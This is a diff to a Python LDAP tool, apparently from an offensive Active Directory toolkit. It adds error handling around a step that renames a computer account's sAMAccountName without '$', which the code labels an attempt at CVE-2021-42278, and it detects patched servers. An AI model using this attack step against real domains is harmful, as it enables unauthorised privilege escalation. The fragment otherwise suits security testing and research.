@@ -347,13 +347,25 @@ def main():
         return
     try:
         logging.info('Modifying attribute (%s) of object (%s): (%s) -> (%s)' % (attribute, dn, args.current_name, args.new_name))
+        cve_attempt = False
         if "CN=Computers" in dn and attribute == 'sAMAccountName' and not args.new_name.endswith('$'):
+            cve_attempt = True
             logging.info('New sAMAccountName does not end with \'$\' (attempting CVE-2021-42278)')
         ldap_session.modify(dn, {attribute: [operation, [args.new_name]]})
         if ldap_session.result['result'] == 0:
             logging.info('Target object modified successfully!')
         else:
-            logging.error('Target object could not be modified...')
+            error_code = int(ldap_session.result['message'].split(':')[0].strip(), 16)
+            if error_code == 0x523 and cve_attempt:
+                # https://support.microsoft.com/en-us/topic/kb5008102-active-directory-security-accounts-manager-hardening-changes-cve-2021-42278-5975b463-4c95-45e1-831a-d120004e258e
+                logging.error('Server probably patched against CVE-2021-42278')
+                logging.debug('The server returned an error: %s', ldap_session.result['message'])
+            if ldap_session.result['result'] == 50:
+                logging.error('Could not modify object, the server reports insufficient rights: %s', ldap_session.result['message'])
+            elif ldap_session.result['result'] == 19:
+                logging.error('Could not modify object, the server reports a constrained violation: %s', ldap_session.result['message'])
+            else:
+                logging.error('The server returned an error: %s', ldap_session.result['message'])
     except Exception as e:
         if logging.getLogger().level == logging.DEBUG:
             traceback.print_exc()
